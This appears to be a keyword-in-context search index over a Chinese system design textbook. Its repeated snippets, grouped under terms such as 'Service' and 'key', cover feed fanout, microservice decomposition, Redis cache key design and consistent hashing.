  c22_b07.md: ...各处理 5 万（50,000）次关注者更新。 * **限速：** 50 万关注者帖子的扇出无法瞬间完成。Fanout Service 以受控速率处理扇出，把 Redis 写入负载分散到数秒而非数毫秒。这防止扇出不受控地飙升 Redis 写入吞吐。 *...
  c22_b07.md: ...着关注者可能不会立刻看到帖子——但新鲜度 SLO（“99% 关注者在 60 秒内看到帖子”）被满足，因为 Fanout Service 在数秒内追上典型关注者数。  对 50 万（500,000）关注者用户，以每个 Fanout worker 每秒 1...
  c22_b08.md: ...,000）关注者用户，扇出在并行下需要数秒。60 秒 SLO 覆盖正常情况。  **系统过载：** 如果 Fanout Service 过载（热门帖子同时大量出现），扇出队列积压，新鲜度下降。Fanout Service 必须按突发容量扩展，而非仅稳态。...
  c22_b08.md: ...统过载：** 如果 Fanout Service 过载（热门帖子同时大量出现），扇出队列积压，新鲜度下降。Fanout Service 必须按突发容量扩展，而非仅稳态。  **名人帖子：** 名人帖子（读时扇出）在用户发帖后加载 feed 的瞬间就出现在...
  c22_b08.md: ...60 秒自动后台刷新）。这确保名人帖子和扇出延迟的帖子在一个刷新周期内出现。  新鲜度 SLO 同时考虑 Fanout Service 延迟和客户端刷新间隔。30 秒服务器（server）扇出时间 + 30 秒客户端刷新间隔 = 60 秒最大新鲜度延迟状...
  c22_b12.md: ...这对扇出架构有什么影响？  提示  思考当只有部分关注者应看到帖子时，扇出流程有什么变化。这如何影响每帖 Fanout Service 的工作量？会简化还是复杂化 timeline 设计？  **答案：** 扇出架构需要感知帖子可见性。关键变化：  **...
  c22_b12.md: ...)`。增加 `close_friends` 关系表：`(user_id, friend_id)`。  **Fanout Service 变更：** 处理 `visibility = 'close_friends'` 的 `post_created` 事件...
  c22_b12.md: ...`visibility = 'close_friends'` 的 `post_created` 事件时，Fanout Service 只获取作者的密友列表（不是所有关注者），并只写入这些用户的 timeline。  **对扇出成本的影响：** 密友帖子...
  c22_b12.md: ...户 F 在用户 U 的密友列表中，F 的 timeline 会同时包含密友帖子和公开帖子。渲染 feed 时，Feed Service 直接返回 timeline 中的内容，无需额外可见性过滤——可见性过滤已在扇出时完成。  **名人密友：** 如果名人...
  c22_b12.md: ...is 中维护每用户“最新活动时间戳”：`user:F:latest_followed_activity`。Fanout Service 在把帖子扇出到 F 的 timeline 时更新它：`SET user:F:latest_followed_activ...
  c22_b16.md: ...名人帖子在读取时合并，开销可忽略。读时用用户专属信号重新排序给出个性化 feed，而无陈旧预计算分数。  Fanout Service（异步 Kafka 消费者）把帖子创建与扇出解耦，让帖子创建立即返回，而扇出在后台在新鲜度 SLO 内完成。  关注者分...
  c27_b04.md: ...## v6 —— 第 16 章：微服务与可靠性（第 24–36 个月）  **它是什么：** 单体分解为服务：User Service、Post Service、Feed Service、Notification Service。加入熔断器。实现优雅降级...
  c27_b04.md: ...章：微服务与可靠性（第 24–36 个月）  **它是什么：** 单体分解为服务：User Service、Post Service、Feed Service、Notification Service。加入熔断器。实现优雅降级（若通知服务宕机，帖子仍可...
  c27_b04.md: ...24–36 个月）  **它是什么：** 单体分解为服务：User Service、Post Service、Feed Service、Notification Service。加入熔断器。实现优雅降级（若通知服务宕机，帖子仍可成功发布）。  **关键决...
  c27_b04.md: ...单体分解为服务：User Service、Post Service、Feed Service、Notification Service。加入熔断器。实现优雅降级（若通知服务宕机，帖子仍可成功发布）。  **关键决策：**  * 服务分解遵循团队结构：每个...
  c27_b06.md: ...砍死，而是逐渐被取代。  SocialSnap 把单体分解为微服务时使用了该模式。他们从提取 Notification Service 开始——风险低、边界清晰的功能。单体继续处理所有其他请求。Notification Service 稳定后，提取 Us...
  c27_b06.md: ...ification Service 开始——风险低、边界清晰的功能。单体继续处理所有其他请求。Notification Service 稳定后，提取 User Service，然后是 Post Service。每次提取都是一个离散、低风险的迁移。  关键...
  c27_b06.md: ...——风险低、边界清晰的功能。单体继续处理所有其他请求。Notification Service 稳定后，提取 User Service，然后是 Post Service。每次提取都是一个离散、低风险的迁移。  关键纪律：在新系统完全验证前保持旧系统运行。...
  c27_b06.md: ...续处理所有其他请求。Notification Service 稳定后，提取 User Service，然后是 Post Service。每次提取都是一个离散、低风险的迁移。  关键纪律：在新系统完全验证前保持旧系统运行。永远不要一次性切换所有流量。使用功...
  c27_b07.md: ...团队的服务。架构必须沿团队边界分解。  SocialSnap 的微服务分解（v6）既是组织需要，也是技术需要。Feed Service 团队需要快速迭代排序算法，而无需等待完整单体部署周期。User Service 团队需要拥有自己的数据模型，而无需与四...
  c27_b07.md: ...）既是组织需要，也是技术需要。Feed Service 团队需要快速迭代排序算法，而无需等待完整单体部署周期。User Service 团队需要拥有自己的数据模型，而无需与四个其他团队协商 schema 变更。  教训：架构不是脱离构建和维护它的组织而存...
  c27_b10.md: ...#### 应用问题  **Q1.** SocialSnap 工程团队正在决定是否把 User Service 拆成两个独立服务：Profile Service（处理用户 profile 和设置）和 Auth Service（处理...
  c27_b10.md: ...*Q1.** SocialSnap 工程团队正在决定是否把 User Service 拆成两个独立服务：Profile Service（处理用户 profile 和设置）和 Auth Service（处理认证和会话管理）。他们应问哪些问题来判断这次拆分是...
  c27_b10.md: ...er Service 拆成两个独立服务：Profile Service（处理用户 profile 和设置）和 Auth Service（处理认证和会话管理）。他们应问哪些问题来判断这次拆分是否值得？拆分引入哪些权衡？  提示  思考耦合、团队 ownin...
  c27_b10.md: ...versa 时新增网络 hop；分布式追踪现在覆盖两个服务；任一服务故障都需要仔细降级设计（Auth 宕机时 User Service 显示什么？）；两个数据库管理；两条部署流水线。对安全与产品职责明确分离的 80 人团队，这次拆分可能值得。  **Q2...
  c28_b12.md: ...h 13) | 服务间调用更高；整体更低（独立扩展） | 服务内强；服务间最终 | 高——部分失败而非整体 | 极高——service mesh、分布式追踪 **Service mesh** (Ch 13) | 轻微开销（sidecar 代理） | N/...
  c28_b12.md: ...独立扩展） | 服务内强；服务间最终 | 高——部分失败而非整体 | 极高——service mesh、分布式追踪 **Service mesh** (Ch 13) | 轻微开销（sidecar 代理） | N/A | 极高（熔断、重试） | 极高——I...
  c28_b12.md: ...h 13) | 服务间调用更高；整体更低（独立扩展） | 服务内强；服务间最终 | 高——部分失败而非整体 | 极高——service mesh、分布式追踪 **Service mesh** (Ch 13) | 轻微开销（sidecar 代理） | N/...
  c28_b12.md: ...独立扩展） | 服务内强；服务间最终 | 高——部分失败而非整体 | 极高——service mesh、分布式追踪 **Service mesh** (Ch 13) | 轻微开销（sidecar 代理） | N/A | 极高（熔断、重试） | 极高——I...
  c28_b20.md: ...3 人拥有核心单体。这两个服务分离后，团队可独立部署。阶段 3（12–18 个月，35 → 50 人）：提取 User Service 和 Analytics Service。围绕它们组建团队。核心单体现在更小。进一步分解前建立 service mesh...
  c28_b20.md: ...队可独立部署。阶段 3（12–18 个月，35 → 50 人）：提取 User Service 和 Analytics Service。围绕它们组建团队。核心单体现在更小。进一步分解前建立 service mesh 和分布式追踪——可观测性必须领先于分解...
  c28_b20.md: ...User Service 和 Analytics Service。围绕它们组建团队。核心单体现在更小。进一步分解前建立 service mesh 和分布式追踪——可观测性必须领先于分解。阶段 4（18–24 个月，50 → 60 人）：提取最后两个服务。...
  c28_b20.md: ...3 人拥有核心单体。这两个服务分离后，团队可独立部署。阶段 3（12–18 个月，35 → 50 人）：提取 User Service 和 Analytics Service。围绕它们组建团队。核心单体现在更小。进一步分解前建立 service mesh...
  c28_b20.md: ...队可独立部署。阶段 3（12–18 个月，35 → 50 人）：提取 User Service 和 Analytics Service。围绕它们组建团队。核心单体现在更小。进一步分解前建立 service mesh 和分布式追踪——可观测性必须领先于分解...
  c28_b20.md: ...User Service 和 Analytics Service。围绕它们组建团队。核心单体现在更小。进一步分解前建立 service mesh 和分布式追踪——可观测性必须领先于分解。阶段 4（18–24 个月，50 → 60 人）：提取最后两个服务。...

=== key (191 occurrences) ===
  c05_b10.md: ...created_at  TIMESTAMP DEFAULT NOW(),         PRIMARY KEY (post_id, user_id)     );          -- 快速找到提及某用户的所有帖子     CR...
  c05_b10.md: ...mentions(user_id);     -- 快速找到某篇帖子提及的所有用户     -- 已由 PRIMARY KEY (post_id, user_id) 覆盖  **为什么这样设计？** 提及是帖子与用户之间的关系——它应该有自己的表...
  c06_b01.md: ...据 | MongoDB, CouchDB, Firestore | | 键值存储（Key-Value Store） | Key → 不透明 value | 极致速度，简单 | Redis, DynamoDB, Memcached | | 列族存储...
  c06_b03.md: ...### 6.3 键值存储——极致速度，最大简单性  最简单的数据模型：一个 key 映射到一个 value。value 是不透明的——数据库存储它而不理解其结构。你通过 key 取回它。       S...
  c06_b03.md: ...最简单的数据模型：一个 key 映射到一个 value。value 是不透明的——数据库存储它而不理解其结构。你通过 key 取回它。       SET user:1:session_token "abc123xyz"     GET use...
  c06_b03.md: ...edis。操作是亚毫秒级，因为 Redis 把整个数据集放在内存中。没有索引、没有 schema、没有 join。只有 key 和 value。   #### 键值存储何时胜出  **缓存：** 第一大用例。用 TTL（time-to-live，...
  c06_b03.md: ...chema、无迁移、无查询计划。可水平扩展（scalability，可扩展性）。  **代价（查询）：** 只能按精确 key 查找数据。Redis 里没有“找出本周登录的所有用户”——那需要扫描每个 key。如果你的访问模式超出 key 查找，...
  c06_b03.md: ...**代价（查询）：** 只能按精确 key 查找数据。Redis 里没有“找出本周登录的所有用户”——那需要扫描每个 key。如果你的访问模式超出 key 查找，键值存储本身不够用。  **代价（持久性）：** 传统键值存储是内存型的，崩溃可能...
  c06_b03.md: ...按精确 key 查找数据。Redis 里没有“找出本周登录的所有用户”——那需要扫描每个 key。如果你的访问模式超出 key 查找，键值存储本身不够用。  **代价（持久性）：** 传统键值存储是内存型的，崩溃可能丢数据。Redis 通过可选持...
  c06_b03.md: ...Redis 通过可选持久化（RDB 快照和 AOF 日志）来缓解，但这增加复杂度和延迟。  **代价（数据关系）：** key 之间没有关系概念。你必须在应用代码中管理这些——这可能复杂且容易出错。  Redis 几乎从来不是系统中唯一的数据库。...
  c06_b04.md: ...#### 列族模型  在列族存储中，数据组织成可能拥有数百万列的行。行由一个**分区键（partition key）** 标识，并可选地有一个**聚类键（clustering key）**。属于同一分区键的所有数据一起存在同一节点上—...
  c06_b04.md: ...百万列的行。行由一个**分区键（partition key）** 标识，并可选地有一个**聚类键（clustering key）**。属于同一分区键的所有数据一起存在同一节点上——这使分区内的范围扫描非常快。  对服务器监控用例：       R...
  c06_b04.md: ...。属于同一分区键的所有数据一起存在同一节点上——这使分区内的范围扫描非常快。  对服务器监控用例：       Row key: server_id + date (e.g., "server-001:2024-01-15")     Colum...
  c06_b07.md: ...数据冗余风险 | | **键值存储（如 Redis）** | ↓↓ 亚毫秒（内存） | ↑↑ 极高 | ↓↓ 默认无跨 key 事务 | ↑↑ 高（内存，但分区容错） | ↓ 有限（内存；需显式持久化配置） | ↓ 最简单模型，但应用管理关系 |...
  c06_b10.md: ...需要分布式方案。  **数据库推荐：** 两层方案：  **第一层：Redis（键值存储）存当前位置：**       Key: "driver:{driver_id}:location"     Value: {lat: 37.7749, lo...
  c06_b15.md: ...和层次嵌套数据。它们用查询灵活性换取 schema 自由。 * **键值存储**（Redis、DynamoDB）为基于 key 的访问提供微秒级延迟。它们用查询能力换取速度和简单性。 * **列族存储**（Cassandra）提供巨大写吞吐和高效...
  c07_b03.md: ...## 应用级缓存（进程内）  应用服务器可以在同一进程内维护一个内存字典作为缓存。当函数结果计算昂贵时，把结果以输入为 key 存入进程本地字典。  **收益：** 零网络延迟——缓存就是同一个程序里的变量。  **代价：** 缓存不跨应用服务器...
  c07_b04.md: ...#### Cache-Aside 算法  读取一个值：       1. Look up the key in the cache     2. If cache HIT:        - Return the cache...
  c07_b04.md: ...SocialSnap 走一遍。用户请求 Alice 的资料时：  **第一次请求（冷缓存）：**  1. 应用检查缓存 key `user:1:profile` —— 未命中 2. 应用查询数据库：`SELECT * FROM users WHE...
  c07_b04.md: ...2. 应用查询数据库：`SELECT * FROM users WHERE id = 1` 3. 应用把结果存入缓存，key `user:1:profile`，TTL = 5 分钟 4. 应用返回 Alice 的资料  **第二次到第 N 次请...
  c07_b04.md: ...= 5 分钟 4. 应用返回 Alice 的资料  **第二次到第 N 次请求（热缓存）：**  1. 应用检查缓存 key `user:1:profile` —— 命中 2. 应用立即返回缓存的资料——无需数据库查询  **Alice 更新简...
  c07_b05.md: ...database at regular intervals   **收益：** 写入以缓存速度完成——毫秒级。如果一个 key 每秒更新 100 次，数据库只接收最新值（合并写入），大幅降低数据库负载。  **代价：** **持久性风险。** 如...
  c07_b05.md: ...side 总是正确的默认。它是最常见模式，但有一个隐藏成本：**惊群问题（thundering herd）**。当缓存 key 过期（或被失效）时，所有原本在缓存命中后等待的请求现在同时命中数据库。如果某个缓存条目每秒服务 5,000 个请求，它...
  c07_b05.md: ...果某个缓存条目每秒服务 5,000 个请求，它过期时，5,000 个请求会在同一秒落到数据库。数据库此前几乎不处理这个 key 的负载，突然收到流量尖峰。  Write-through 避免这个问题：写入时缓存立即重新填充，所以条目从不真正缺失。...
  c07_b05.md: ...载，突然收到流量尖峰。  Write-through 避免这个问题：写入时缓存立即重新填充，所以条目从不真正缺失。对热 key（被巨量请求访问的数据），write-through 通常更可取，正因为它消除了惊群。   ### 7.5 驱逐——缓存...
  c07_b06.md: ...**LRU 如何工作：** 内部上，LRU 缓存维护一个数据结构（通常是双向链表加哈希表）来跟踪访问顺序。每次访问 key，它就被移到“最近使用”端。“最近最少使用”端是驱逐候选。  **LRU 的代价：** 维护访问顺序结构给每次缓存操作增...
  c07_b06.md: ...使用）、随机驱逐或“近似 LRU”——可以减少开销，代价是驱逐决策不那么最优。Redis 使用近似 LRU：采样一部分 key，在其中驱逐最近最少访问的。   #### 其他驱逐策略  **LFU（Least Frequently Used，最少...
  c07_b06.md: ...# 其他驱逐策略  **LFU（Least Frequently Used，最少频繁使用）：** 驱逐总访问次数最少的 key。当热度随时间稳定时比 LRU 更好（上周流行且今天仍然流行的数据项应该保留；LRU 可能因为它在过去一小时内没被访问而...
  c07_b08.md: ...ialSnap 历史上第一个陈旧性 bug。但不会是最后一个。  修复办法是确保所有修改用户数据的代码路径都使相关缓存 key 失效。但这次事故揭示了关于缓存的基本事实：**给系统加缓存不只是性能改动——它是一项架构改动，会创造一类新的正确性 b...
  c07_b08.md: ...数据源变化时变陈旧  越难检测陈旧性，失效就越难。对简单实体更新（用户资料、帖子内容），失效很直接：实体变化时删除缓存 key。对派生数据（热门列表、聚合统计、推荐结果），失效需要知道哪些缓存条目依赖哪些底层数据——而这个依赖图可能很复杂。  T...
  c07_b13.md: ...——有点烦人，但可接受。  缓存策略：**Cache-aside**，长 TTL（30–60 分钟）。照片更新时使缓存 key 失效。长 TTL 可接受，因为更新少且陈旧影响低。  缓存 key：`user:{user_id}:photo_url...
  c07_b13.md: ...，长 TTL（30–60 分钟）。照片更新时使缓存 key 失效。长 TTL 可接受，因为更新少且陈旧影响低。  缓存 key：`user:{user_id}:photo_url`  **(b) 未读通知数：**  访问模式：每个登录用户的每次页...
  c07_b13.md: ...源，数据库作为备份。这本质上是 write-through：每个通知事件同时更新数据库和 Redis 计数器。  缓存 key：`user:{user_id}:unread_count`  **(c) 全站帖子总数：**  访问模式：显示在网站的...
  c07_b14.md: ...200 次/秒）。单台 PostgreSQL 在峰值时吃力。设计一种缓存策略，使数据库负载降低至少 90%。请说明缓存 key、TTL、驱逐策略和失效逻辑。  提示...
  c07_b15.md: ...Feed 是 per-user 的——每个用户看到不同 Feed。这意味着每个用户一个缓存 key。想想 Feed 多久变化：用户网络中某处有新帖子。每个被关注用户的每篇新帖子都要使每个粉丝的 Feed 缓存失效吗？在...
  c07_b15.md: ...被关注用户的每篇新帖子都要使每个粉丝的 Feed 缓存失效吗？在什么规模下这变得不可行？  **答案：**  **缓存 key：** `user:{user_id}:feed` —— 每个用户一个条目，存储 Top 50 帖子 ID 及其排序分的...
  c08_b12.md: ...: 1001,       "like_id": 88921     }   `event_id`（UUID）是幂等性 key。`like_id` 是数据库中点赞的主键——也对去重有用。  **生产者：** SocialSnap 应用服务器中的“...
  c08_b12.md: ...静默什么都不做。这是幂等插入——数据库级唯一约束无需显式先检查后行动代码就强制幂等。  这种用事件 UUID 作幂等性 key 加数据库唯一约束的模式，是生产安全的幂等消息处理方法。  **Q2.**（联系第 7 章陈旧性讨论）SocialSna...
  c08_b12.md: ...的资料失效，这样资料页才能显示正确通知数。” 另一个说：“通知计数不存在资料缓存里——它们是分开的。” 谁对？关于缓存 key 设计有什么更广泛的教训？  提示  想想每个缓存 key 实际存什么。资料缓存（第 7 章）存哪些字段？通知计数属于那...
  c08_b12.md: ...通知计数不存在资料缓存里——它们是分开的。” 谁对？关于缓存 key 设计有什么更广泛的教训？  提示  想想每个缓存 key 实际存什么。资料缓存（第 7 章）存哪些字段？通知计数属于那里吗？这暗示了粒度该如何？  **答案：** 第二个工程师...
  c08_b12.md: ...（第 7 章）存哪些字段？通知计数属于那里吗？这暗示了粒度该如何？  **答案：** 第二个工程师对。这个争论揭示缓存 key 设计的关键原则：**缓存 key 应限定在单一、内聚的数据片段**。...
  c08_b12.md: ...属于那里吗？这暗示了粒度该如何？  **答案：** 第二个工程师对。这个争论揭示缓存 key 设计的关键原则：**缓存 key 应限定在单一、内聚的数据片段**。...
  c08_b13.md: ...在第 7 章的 SocialSnap v2 中，资料缓存 key `user:{user_id}:profile` 存储 users 表的数据：用户名、简介、头像 URL、加入日期等稳...
  c08_b13.md: ...一部分——它来自 notifications 表，频繁变化（每次点赞、评论、关注等）。  如果通知计数被包含在资料缓存 key 中，每个 incoming 通知都会要求使整个资料缓存失效——迫使数据库重新取回没变化的简介、头像 URL 和其他稳定...
  c08_b13.md: ...和其他稳定数据。这是缓存失效浪费：你因为页面上显示的一个快速变化字段而驱逐并重新取回缓慢变化的数据。  **正确的缓存 key 设计（粒度分离）：**  * `user:{user_id}:profile` → 稳定字段（bio、photo_ur...
  c08_b13.md: ...——短 TTL（10–30 秒）或通过 Redis `INCR`/`DECR` 作为事实来源  更广泛的教训：**缓存 key 粒度应匹配数据变化频率**。如果字段 A 每周变化一次，字段 B 每秒变化 100 次，把它们存在同一个缓存 key...
  c08_b13.md: ...key 粒度应匹配数据变化频率**。如果字段 A 每周变化一次，字段 B 每秒变化 100 次，把它们存在同一个缓存 key 中意味着 B 的每次变化都会驱逐 A 的缓存值—— defeats 缓存 A 的目的。  这是第 5 章反规范化讨论在...
  c08_b13.md: ...defeats 缓存 A 的目的。  这是第 5 章反规范化讨论在缓存中的对应：你为了优化访问模式而结构化数据。缓存 key 设计就是缓存 schema 设计。粒度错了，命中率就受影响。  **Q3.**（联系第 6 章 CAP 定理讨论和第...
  c09_b04.md: ...cialSnap 的 Redis 缓存是一个三节点集群：Redis-1、Redis-2、Redis-3。应用对每个缓存 key 哈希以决定存在哪个节点：`hash(key) mod 3`。Key `user:42:profile` 存在节点 `h...
  c09_b04.md: ...1、Redis-2、Redis-3。应用对每个缓存 key 哈希以决定存在哪个节点：`hash(key) mod 3`。Key `user:42:profile` 存在节点 `hash("user:42:profile") mod 3 = 1`...
  c09_b04.md: ...新增节点。如果 Redis-1 故障，现在只剩两个节点。公式变成 `hash(key) mod 2`。突然，大多数缓存 key 路由到不同节点——缓存失效了。每个原本会去 Redis-1 的 key 现在都路由到不同节点。你迎来大规模缓存未命中。...
  c09_b04.md: ...sh(key) mod 2`。突然，大多数缓存 key 路由到不同节点——缓存失效了。每个原本会去 Redis-1 的 key 现在都路由到不同节点。你迎来大规模缓存未命中。  新增节点同理：4 个节点而不是 3 个，`hash(key) mod...
  c09_b04.md: ...。你迎来大规模缓存未命中。  新增节点同理：4 个节点而不是 3 个，`hash(key) mod 4` 会让几乎每个 key 都路由到不同节点。  **一致性哈希（consistent hashing）** 解决这个问题。   #### 定义：...
  c09_b04.md: ...shing）** 解决这个问题。   #### 定义：一致性哈希  **一致性哈希** 是一种分布技术：缓存节点和缓存 key 都映射到一个概念环（哈希空间）上的位置。每个 key 存在从它所在位置顺时针第一个节点上。  plain 语言：想象一...
  c09_b04.md: ...一致性哈希  **一致性哈希** 是一种分布技术：缓存节点和缓存 key 都映射到一个概念环（哈希空间）上的位置。每个 key 存在从它所在位置顺时针第一个节点上。  plain 语言：想象一个从 0 到 2^32-1 的圆形数轴（32 位哈希空...
  c09_b04.md: ...：想象一个从 0 到 2^32-1 的圆形数轴（32 位哈希空间）。每个缓存节点按节点名哈希放在环上某个位置。每个缓存 key 按 key 哈希放在环上某个位置。一个 key 被分配给从它位置顺时针最近的节点。  一致性哈希的关键性质：当节点加入...
  c09_b04.md: ...0 到 2^32-1 的圆形数轴（32 位哈希空间）。每个缓存节点按节点名哈希放在环上某个位置。每个缓存 key 按 key 哈希放在环上某个位置。一个 key 被分配给从它位置顺时针最近的节点。  一致性哈希的关键性质：当节点加入或移除时，只...
  c09_b04.md: ...32 位哈希空间）。每个缓存节点按节点名哈希放在环上某个位置。每个缓存 key 按 key 哈希放在环上某个位置。一个 key 被分配给从它位置顺时针最近的节点。  一致性哈希的关键性质：当节点加入或移除时，只有映射到该节点的 key 需要重新分...
  c09_b04.md: ...位置。一个 key 被分配给从它位置顺时针最近的节点。  一致性哈希的关键性质：当节点加入或移除时，只有映射到该节点的 key 需要重新分配。其他所有 key 都留在现有节点上。  **用 3 个节点和普通取模哈希：** 加入第 4 个节点会使约...
  c09_b04.md: ...位置顺时针最近的节点。  一致性哈希的关键性质：当节点加入或移除时，只有映射到该节点的 key 需要重新分配。其他所有 key 都留在现有节点上。  **用 3 个节点和普通取模哈希：** 加入第 4 个节点会使约 75% 的缓存 key 失效（...
  c09_b04.md: ...他所有 key 都留在现有节点上。  **用 3 个节点和普通取模哈希：** 加入第 4 个节点会使约 75% 的缓存 key 失效（大多数 key 在新取模下哈希到不同服务器）。  **用一致性哈希：** 加入第 4 个节点只影响约 25% 的...
  c09_b04.md: ...失效（大多数 key 在新取模下哈希到不同服务器）。  **用一致性哈希：** 加入第 4 个节点只影响约 25% 的 key——那些落在环上新节点负责区段的 key。其余 75% 留在当前节点。  这就是分布式缓存（Redis Cluster、...
  c09_b04.md: ...同服务器）。  **用一致性哈希：** 加入第 4 个节点只影响约 25% 的 key——那些落在环上新节点负责区段的 key。其余 75% 留在当前节点。  这就是分布式缓存（Redis Cluster、Memcached 客户端）用一致性哈希...
  c09_b04.md: ...余 75% 留在当前节点。  这就是分布式缓存（Redis Cluster、Memcached 客户端）用一致性哈希做 key 分布的原因。负载均衡器在为缓存亲和性重要的 IP 哈希路由时也用它。   ### 9.5 DNS——互联网的电话簿...
  c09_b04.md: ...cialSnap 的 Redis 缓存是一个三节点集群：Redis-1、Redis-2、Redis-3。应用对每个缓存 key 哈希以决定存在哪个节点：`hash(key) mod 3`。Key `user:42:profile` 存在节点 `h...
  c09_b04.md: ...1、Redis-2、Redis-3。应用对每个缓存 key 哈希以决定存在哪个节点：`hash(key) mod 3`。Key `user:42:profile` 存在节点 `hash("user:42:profile") mod 3 = 1`...
  c09_b04.md: ...新增节点。如果 Redis-1 故障，现在只剩两个节点。公式变成 `hash(key) mod 2`。突然，大多数缓存 key 路由到不同节点——缓存失效了。每个原本会去 Redis-1 的 key 现在都路由到不同节点。你迎来大规模缓存未命中。...
  c09_b04.md: ...sh(key) mod 2`。突然，大多数缓存 key 路由到不同节点——缓存失效了。每个原本会去 Redis-1 的 key 现在都路由到不同节点。你迎来大规模缓存未命中。  新增节点同理：4 个节点而不是 3 个，`hash(key) mod...
  c09_b04.md: ...。你迎来大规模缓存未命中。  新增节点同理：4 个节点而不是 3 个，`hash(key) mod 4` 会让几乎每个 key 都路由到不同节点。  **一致性哈希（consistent hashing）** 解决这个问题。   #### 定义：...
  c09_b04.md: ...shing）** 解决这个问题。   #### 定义：一致性哈希  **一致性哈希** 是一种分布技术：缓存节点和缓存 key 都映射到一个概念环（哈希空间）上的位置。每个 key 存在从它所在位置顺时针第一个节点上。  plain 语言：想象一...
  c09_b04.md: ...一致性哈希  **一致性哈希** 是一种分布技术：缓存节点和缓存 key 都映射到一个概念环（哈希空间）上的位置。每个 key 存在从它所在位置顺时针第一个节点上。  plain 语言：想象一个从 0 到 2^32-1 的圆形数轴（32 位哈希空...
  c09_b04.md: ...：想象一个从 0 到 2^32-1 的圆形数轴（32 位哈希空间）。每个缓存节点按节点名哈希放在环上某个位置。每个缓存 key 按 key 哈希放在环上某个位置。一个 key 被分配给从它位置顺时针最近的节点。  一致性哈希的关键性质：当节点加入...
  c09_b04.md: ...0 到 2^32-1 的圆形数轴（32 位哈希空间）。每个缓存节点按节点名哈希放在环上某个位置。每个缓存 key 按 key 哈希放在环上某个位置。一个 key 被分配给从它位置顺时针最近的节点。  一致性哈希的关键性质：当节点加入或移除时，只...
  c09_b04.md: ...32 位哈希空间）。每个缓存节点按节点名哈希放在环上某个位置。每个缓存 key 按 key 哈希放在环上某个位置。一个 key 被分配给从它位置顺时针最近的节点。  一致性哈希的关键性质：当节点加入或移除时，只有映射到该节点的 key 需要重新分...
  c09_b04.md: ...位置。一个 key 被分配给从它位置顺时针最近的节点。  一致性哈希的关键性质：当节点加入或移除时，只有映射到该节点的 key 需要重新分配。其他所有 key 都留在现有节点上。  **用 3 个节点和普通取模哈希：** 加入第 4 个节点会使约...
  c09_b04.md: ...位置顺时针最近的节点。  一致性哈希的关键性质：当节点加入或移除时，只有映射到该节点的 key 需要重新分配。其他所有 key 都留在现有节点上。  **用 3 个节点和普通取模哈希：** 加入第 4 个节点会使约 75% 的缓存 key 失效（...
  c09_b04.md: ...他所有 key 都留在现有节点上。  **用 3 个节点和普通取模哈希：** 加入第 4 个节点会使约 75% 的缓存 key 失效（大多数 key 在新取模下哈希到不同服务器）。  **用一致性哈希：** 加入第 4 个节点只影响约 25% 的...
  c09_b04.md: ...失效（大多数 key 在新取模下哈希到不同服务器）。  **用一致性哈希：** 加入第 4 个节点只影响约 25% 的 key——那些落在环上新节点负责区段的 key。其余 75% 留在当前节点。  这就是分布式缓存（Redis Cluster、...
  c09_b04.md: ...同服务器）。  **用一致性哈希：** 加入第 4 个节点只影响约 25% 的 key——那些落在环上新节点负责区段的 key。其余 75% 留在当前节点。  这就是分布式缓存（Redis Cluster、Memcached 客户端）用一致性哈希...
  c09_b04.md: ...余 75% 留在当前节点。  这就是分布式缓存（Redis Cluster、Memcached 客户端）用一致性哈希做 key 分布的原因。负载均衡器在为缓存亲和性重要的 IP 哈希路由时也用它。   ### 9.5 DNS——互联网的电话簿...
  c09_b10.md: ...达业务逻辑代码。  **API 网关职责：**  **认证/授权：** 对每个请求验证 JWT token 或 API key。如果无效，立即拒绝。后端服务只收到已认证请求。  **限流：** 执行每用户或每 API key 的请求配额。防止单个...
  c09_b10.md: ...oken 或 API key。如果无效，立即拒绝。后端服务只收到已认证请求。  **限流：** 执行每用户或每 API key 的请求配额。防止单个用户每秒发送 10,000 次请求。  **请求路由：** 把 `/api/users` 路由到用...
  c09_b12.md: ...哈希？解释为什么它在缓存集群加入或移除节点时优于简单取模哈希。  **答案：** **一致性哈希** 把缓存节点和缓存 key 都放到一个概念环形哈希空间（“环”）上。每个 key 被分配给环上从它位置顺时针最近的节点。  **为什么取模哈希在大...
  c09_b12.md: ...模哈希。  **答案：** **一致性哈希** 把缓存节点和缓存 key 都放到一个概念环形哈希空间（“环”）上。每个 key 被分配给环上从它位置顺时针最近的节点。  **为什么取模哈希在大规模下失败：** 有 `N` 个节点时，每个 key...
  c09_b12.md: ...key 被分配给环上从它位置顺时针最近的节点。  **为什么取模哈希在大规模下失败：** 有 `N` 个节点时，每个 key 映射到 `hash(key) mod N`。当加入节点（N 变 N+1），几乎每个 key 的分配都变了——因为几乎所...
  c09_b12.md: ...有 `N` 个节点时，每个 key 映射到 `hash(key) mod N`。当加入节点（N 变 N+1），几乎每个 key 的分配都变了——因为几乎所有 key 在 `mod(N+1)` 和 `mod N` 下哈希到不同位置。向 10 节点集...
  c09_b12.md: ...射到 `hash(key) mod N`。当加入节点（N 变 N+1），几乎每个 key 的分配都变了——因为几乎所有 key 在 `mod(N+1)` 和 `mod N` 下哈希到不同位置。向 10 节点集群加 1 节点会改变约 91% 的 k...
  c09_b12.md: ...y 在 `mod(N+1)` 和 `mod N` 下哈希到不同位置。向 10 节点集群加 1 节点会改变约 91% 的 key。整个缓存实际上失效。  **为什么一致性哈希更好：** 向环中加入节点时，只有新节点“接管”的环段中的 key 会被重...
  c09_b12.md: ...% 的 key。整个缓存实际上失效。  **为什么一致性哈希更好：** 向环中加入节点时，只有新节点“接管”的环段中的 key 会被重新分配。其余 key 都留在现有节点上。对 N 节点集群新增节点，大约 1/N 的 key 被重新分配——正好是...
  c09_b12.md: ...上失效。  **为什么一致性哈希更好：** 向环中加入节点时，只有新节点“接管”的环段中的 key 会被重新分配。其余 key 都留在现有节点上。对 N 节点集群新增节点，大约 1/N 的 key 被重新分配——正好是现在属于新节点区段的那些。...
  c09_b12.md: ...点“接管”的环段中的 key 会被重新分配。其余 key 都留在现有节点上。对 N 节点集群新增节点，大约 1/N 的 key 被重新分配——正好是现在属于新节点区段的那些。  数值上：向 3 节点一致性哈希集群加入第 4 节点，重新分配约 25...
  c09_b12.md: ...分配——正好是现在属于新节点区段的那些。  数值上：向 3 节点一致性哈希集群加入第 4 节点，重新分配约 25% 的 key（环的 1/4 属于新节点）。向 3 节点取模集群加入第 4 节点，重新分配约 75% 的 key。对大型缓存，这种差异...
  c09_b12.md: ...新分配约 25% 的 key（环的 1/4 属于新节点）。向 3 节点取模集群加入第 4 节点，重新分配约 75% 的 key。对大型缓存，这种差异巨大，因为大规模缓存未命中会冲垮数据库。  **Q3.** 什么是 WebSocket？它与标准...
